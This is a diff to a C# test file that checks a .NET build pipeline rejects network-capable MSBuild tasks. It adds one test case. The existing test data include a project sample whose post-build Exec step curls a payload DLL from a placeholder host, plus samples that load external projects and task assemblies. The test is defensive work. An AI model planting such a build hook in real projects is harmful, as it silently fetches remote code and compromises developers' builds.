@@ -69,6 +69,7 @@ public sealed partial class DotNetPublishPipelineRunnerManifestProvenanceTests
     [InlineData("<Project><Target Name=\"Fetch\" AfterTargets=\"Build\"><Exec Command=\"curl https://example.invalid/payload.dll\" /></Target></Project>")]
     [InlineData("<Project><Target Name=\"Fetch\" AfterTargets=\"Build\"><MSBuild Projects=\"external.proj\" /></Target></Project>")]
     [InlineData("<Project><UsingTask TaskName=\"ExternalTask\" AssemblyFile=\"external.dll\" /></Project>")]
+    [InlineData("<Project TreatAsLocalProperty=\"RunAnalyzers;RestoreSources\" />")]
     public void ControlledBuildInputs_RejectNetworkCapableTrackedTasks(string projectXml)
     {
         string root = Directory.CreateTempSubdirectory().FullName;
